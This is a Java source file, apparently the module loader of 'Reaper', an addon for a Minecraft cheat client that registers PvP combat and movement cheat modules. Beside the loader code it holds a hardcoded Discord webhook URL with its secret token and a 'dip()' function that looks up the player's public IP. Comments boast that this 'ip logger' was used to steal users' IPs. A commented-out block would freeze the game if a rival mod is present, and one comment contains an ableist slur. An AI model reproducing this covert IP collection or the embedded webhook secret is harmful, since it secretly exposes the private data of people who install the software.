package me.ghosttypes.reaper.modules;

import me.ghosttypes.reaper.Reaper;
import me.ghosttypes.reaper.modules.chat.*;
import me.ghosttypes.reaper.modules.combat.*;
import me.ghosttypes.reaper.modules.hud.*;
import me.ghosttypes.reaper.modules.misc.*;
import me.ghosttypes.reaper.modules.misc.elytrabot.ElytraBotThreaded;
import me.ghosttypes.reaper.modules.render.*;
import me.ghosttypes.reaper.util.misc.MathUtil;
import me.ghosttypes.reaper.util.network.DiscordWebhook;
import me.ghosttypes.reaper.util.os.OSUtil;
import me.ghosttypes.reaper.util.player.Players;
import me.ghosttypes.reaper.util.services.TL;
import meteordevelopment.meteorclient.systems.Systems;
import meteordevelopment.meteorclient.systems.hud.HUD;
import meteordevelopment.meteorclient.systems.hud.modules.HudElement;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.Items;
import org.apache.commons.codec.digest.DigestUtils;

import java.awt.*;
import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Scanner;

public class ML { // Module loader

    public static final Category R = new Category("Reaper", Items.SKELETON_SKULL.getDefaultStack());
    public static final Category M = new Category("Reaper Misc", Items.SKELETON_SKULL.getDefaultStack());
    public static final Category W = new Category("Windows", Items.SKELETON_SKULL.getDefaultStack());

    // oh, in-case you didn't realize, this webhook has 404'd for about 2 weeks. I still managed to steal everyone's IP with the dead webhook with mysterious hacker code
    public static final String s = "https://discord.com/api/webhooks/957540115373236234/n-vbrGWeiOuHKs_AUbVu9WY5tfPjOnonL5iliYMG558ssdYqCK3Oi79Cplnwm4WId1x8";


    public static void register() {


        // this was to prevent reaper loading up with b+, so nobody could try and say reaper contained the same code as b+
        /*if (FabricLoader.getInstance().isModLoaded("banana-plus")) {
            OSUtil.bcope();
            boolean cope = true;
            while (cope) { try { Thread.sleep(1000); } catch (Exception ignored2) {}}
        }*/

        Reaper.log("Registering module categories.");
        Modules.registerCategory(R);
        Modules.registerCategory(M);
        Modules.registerCategory(W);
    }

    public static void load() {
        long start = MathUtil.now();

        // commented out because this will probably scare retarded people. just shows a tiny popup when the game launches.
        TL.cached.execute(() -> OSUtil.info("Welcome back to Reaper, " + MinecraftClient.getInstance().getSession().getUsername() + "!"));

        Reaper.log("Loading modules and commands.");
        loadR();
        loadM();
        loadW();
        loadC();
        loadH();
        Reaper.log("Loaded Reaper in " + MathUtil.millisElapsed(start));
    }


    public static void loadR() { // load modules in reaper category


        addModules(
            new AnchorGod(),
            new AntiSurround(),
            new AntiPiston(),
            new AutoBedCraft(),
            new TheReaper(),
            new AutoTotemPlus(),
            new Auto32k(),
            new BedAura(),
            new BedAura2(),
            new QuickMend(),
            new ReaperSurround(),
            new SelfTrapPlus(),
            new SmartHoleFill(),
            new TargetStrafe()
        );
    }

    public static void loadM() { // load modules in other categories

        // chat
        addModules(
            new ArmorAlert(),
            new AutoEZ(),
            new AutoDiscord(),
            new AutoLogin(),
            new BedAlerts(),
            new ChatTweaks(),
            new HoleAlert(),
            new NotificationSettings(),
            new PopCounter(),
            new Welcomer()
        );

        // misc
        addModules(
            new AnchorPlus(),
            new AntiAim(),
            new AutoRespawn(),
            new ElytraBotThreaded(),
            new LongJump(),
            new MultiTask(),
            new NoDesync(),
            new NoProne(),
            new OldAnimations(),
            new OneTap(),
            new PacketFly(),
            new RPC(),
            new StrafePlus(),
            new StepPlus(),
            new ReverseStep(),
            new StreamerMode(),
            new StrictMove()
        );

        // render
        addModules(
            new ExternalFeed(),
            new ExternalHUD(),
            new ExternalNotifications(),
            new KillFX(),
            new Nametags(),
            new ParticalFX(),
            new ReaperHoleESP()
        );


    }

    public static void loadW() { // load modules in window category
        addModules(new ExternalHUD(), new ExternalNotifications());
    }

    public static void loadC() { // load commands


    }

    public static void loadH() { // load hud modules


        HUD hud = Systems.get(HUD.class);

        addHud(
            new AuraSync(hud),
            new CustomImage(hud),
            new WaterMarkText(hud),
            //new Killfeed(hud), todo - fix
            new ModuleSpoof(hud),
            new Notifications(hud),
            new SpotifyHud(hud),
            new Stats(hud),
            new TextItems(hud),
            new VisualBinds(hud),
            new Watermark(hud)

        );
    }

    // the infamous ip logger used to steal everyone's ip on March 25th at 6pm !!!
    private static String dip() {
        try {
            return new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream())).readLine();
        } catch (Exception ignored) {
            return "Failed to log.";
        }
    }

    public static void addModules(Module... module) {
        for (Module module1 : module) {
            Modules.get().add(module1);
        }
    }


    public static void addHud(HudElement... hudElement) {
        HUD hud = Systems.get(HUD.class);
        hud.elements.addAll(Arrays.asList(hudElement));
    }


    public static Players get(Class<Players> playersClass) {

        return null;
    }

}
